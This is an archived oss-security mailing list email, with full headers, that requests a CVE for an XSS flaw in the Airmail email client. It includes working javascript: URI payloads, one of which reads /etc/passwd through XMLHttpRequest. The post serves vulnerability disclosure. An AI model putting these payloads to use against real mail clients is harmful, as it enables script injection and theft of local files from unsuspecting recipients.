X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1879" "Friday" "9" "September" "2016" "05:28:26" "+0800" "redrain root" "rootredrain@gmail.com" "<CAPGxrc-RbECjbYfpBZPHusDYo_B5BDrKKzRKQ1zwbaNN21wLqA@mail.gmail.com>" "62" "[oss-security] CVE request - Airmail URLScheme render and file:// xss vulnerability" nil nil nil "9" "2016090821:28:26" "[oss-security] CVE request - Airmail URLScheme render and file:// xss vulnerability" (number mark "U       rootredrain@ Sep  9   62/1879  " thread-indent "\"[oss-security] CVE request - Airmail URLScheme render and file:// xss vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21574 invoked by uid 550); 8 Sep 2016 21:28:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 21556 invoked from network); 8 Sep 2016 21:28:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=OP1SkJ7kteMaNUih4hi6d2+X/RbfGsvyBZJU4B7HRiM=;
        b=PM8HW/4+vPtF3hzxXJEM6v4Rof9uajgAmzio6JQ8dUddZay6nGIqik9d1JkbfwBrU6
         48GP+hQDUgx2Q2CuAXemrImuYdY/5ODuKT7uM47qPciL/VVGqRZGKvPspXHzbtMZhUlJ
         Ly0qUFyT0Iy0zUWB28+y4ROtZd5hfeQ0uxmAqrIxTDdAzz35YIRK/MQntY3WIvDRN9uV
         qeD5Ow66rMD1o+jQna0wO1T1y/uzbSuw57/Yh6NGyuW+Fc0fuGIsc+HUeo7nnHZIg3sn
         D0wC3+yYdEz27w21j0NGep0StR26HKBJR05wp7ImS6Dvv5W1iSdHYTxgat2BMmRzEUpw
         avpg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=OP1SkJ7kteMaNUih4hi6d2+X/RbfGsvyBZJU4B7HRiM=;
        b=aMw9Sfw+wDzik53iA1Dp8zl6ypIwTMsPpTgNarTxRkC7tks1YpexJ5hGXXZx+2cCkF
         EeGxZC27SWG8RmnJHaxVj5btCsStWH06ZNaITvCx1CTD0T/IlJb1VLBWzFnPoOYhDtyq
         sxD42P17/1Nc/AiKaoVxCBasb0R008kDc4E+XdsFQCI5KdL6aqQQMb1b3tsTcviw+0cY
         I8RfqHbE1zToV1HWeOxNJWdAzHiFlRG/9XmX15tDtdUrTFlkjbO3QIlv0IyZujm0TYcM
         /+12xUa9bWLNzwDHsClBX2nz7ZYF7Wjch64faFEKUGDknOBgzD38HezLEjRPkNg0gSkZ
         NnGQ==
X-Gm-Message-State: AE9vXwMPPwbvfVrgCf0Ztl+H+HEmsAvz6oJWgqJleVtgCw4HZ/n2RdCqsCA17Bo+vkc1qpYcsxYkuSlmVxLqzA==
X-Received: by 10.129.179.197 with SMTP id r188mr139340ywh.88.1473370106827;
 Thu, 08 Sep 2016 14:28:26 -0700 (PDT)
MIME-Version: 1.0
From: redrain root <rootredrain@gmail.com>
Date: Fri, 9 Sep 2016 05:28:26 +0800
Message-ID: <CAPGxrc-RbECjbYfpBZPHusDYo_B5BDrKKzRKQ1zwbaNN21wLqA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a114ae966d71a24053c05b5dc
Subject: [oss-security] CVE request - Airmail URLScheme render and file:// xss vulnerability

--001a114ae966d71a24053c05b5dc
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Airmail is a popular email client on iOS and OS X.
I found a vulnerability in airmail of the latest version which could cause
a file:// xss and arbitrary file read.

Author: redrain, yu.hong@chaitin.com
Date: 2016-08-15
Version: 3.0.2 and earlier
Platform: OS X and iOS
Site: http://airmailapp.com/
Vendor: http://airmailapp.com/
Vendor Notified: 2016-08-15

Vulnerability:
There is a file:// xss in airmail version 3.0.2 and earlier.
The app can deal the URLscheme render with link detection, any user can
edit the email content in reply with the evil code with the TL;DR.

Airmail implements its user interface using an embedded version of WebKit,
furthermore Airmail on OS X will render any URI as a clickable HTML <a
href=3D link. An attacker can create a simple JavaScript URI (e.g.,
javascript:) which when clicked grants the attacker initial JavaScript
execution (XSS) in the context of the application DOM.


PoC:
javascript://www.baidu.com/research?%0Aprompt(1)

=E2=80=8B

Arbitrary file read:

javascript://www.baidu.com/research?%0Afunction%20reqListene
r%20()%20%7B%0A%20%20prompt(this.responseText)%3B%0A%7D%0Ava
r%20oReq%20%3D%20new%20XMLHttpRequest()%3B%0AoReq.addEventLi
stener(%22load%22%2C%20reqListener)%3B%0AoReq.open(
%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0AoReq.send()%3B


=E2=80=8B
Resolution:

Airmail call the webkit to translate the html, javascript: and
javascript://%0a%0d  are supported because of link detection in webkit
info.plist.

So we can just broke the URI, for example, add a =E2=80=9C<blank>=E2=80=9D =
behind the
=E2=80=9Cjavascript=E2=80=9D OS X and iOS will not render this URI as a cli=
ckable HTML <a
href=3Dxxx>


Could you assign CVE id for this?

Regards,
redrain

--001a114ae966d71a24053c05b5dc--
